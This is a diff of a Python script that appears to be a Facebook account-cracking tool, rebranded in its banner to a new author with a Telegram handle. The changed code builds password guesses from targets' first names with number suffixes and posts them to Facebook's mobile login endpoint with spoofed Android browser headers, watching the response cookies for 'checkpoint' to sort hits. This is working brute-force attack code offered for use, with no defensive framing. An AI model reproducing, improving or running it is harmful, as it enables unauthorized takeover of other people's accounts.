@@ -300,11 +300,11 @@ def banner():
          __|__
        //.=|=.\\
       // .=|=. \\
-      \\ .=|=. //.   CODE BY  : LUNA
-       \\(_=_)//.   Telegram : LUNA
-        (:| |:).      Github   : NO
-         || ||.       Team     : no
-         () ().      Version  : 1.5
+      \\ .=|=. //.   CODE BY  : Mrbx_709
+       \\(_=_)//.   Telegram : @Mrbx_709
+        (:| |:).      Github   : https://t.me/icstarpro
+         || ||.       Team     : 709
+         () ().      Version  : V.3
          || ||
          || ||                           
  ╔╦══• •✠•❀ UPDATE ❀•✠ • •══╦╗
@@ -845,7 +845,6 @@ def passwrd():
 					if len(frs)<3:
 						pass
 					else:
-						pwv.append(nmf)
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
@@ -854,16 +853,8 @@ def passwrd():
 						pwv.append(frs+'321')
 						pwv.append(frs+'4321')
 						pwv.append(frs+'54321')
-						pwv.append('123'+frs+'123')
-						pwv.append('1234'+frs+'1234')
-						pwv.append('12345'+frs+'12345')
-						pwv.append('123'+frs)
-						pwv.append('1234'+frs)
-						pwv.append('12345'+frs)
-						pwv.append('123'+frs+frs)
-						pwv.append('12345'+frs+frs)
-						pwv.append(frs+frs+'123')
-						pwv.append(frs+frs+'12345')
+						pwv.append(frs+'1122')
+						pwv.append(frs+'112233')
 						pwv.append(frs+frs)
 
 				else:
@@ -884,17 +875,10 @@ def passwrd():
 						pwv.append(frs+'321')
 						pwv.append(frs+'4321')
 						pwv.append(frs+'54321')
-						pwv.append('123'+frs+'123')
-						pwv.append('1234'+frs+'1234')
-						pwv.append('12345'+frs+'12345')
-						pwv.append('123'+frs)
-						pwv.append('1234'+frs)
-						pwv.append('12345'+frs)
-						pwv.append('123'+frs+frs)
-						pwv.append('12345'+frs+frs)
-						pwv.append(frs+frs+'123')
-						pwv.append(frs+frs+'12345')
+						pwv.append(frs+'1122')
+						pwv.append(frs+'112233')
 						pwv.append(frs+frs)
+
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -961,7 +945,7 @@ def crack(idf,pwv):
 'is_smart_lock': False,
 'bi_xrwh': 0
 }
-			headers = {'Host': 'd.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://d.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://d.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fd.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
+			headers = {'authority': 'd.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0',  'referer': 'https://d.facebook.com/', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"Redmi Note 8 Pro"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"11.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1','upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5', 'viewport-width': '980', }
 			po = ses.post('https://d.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				break
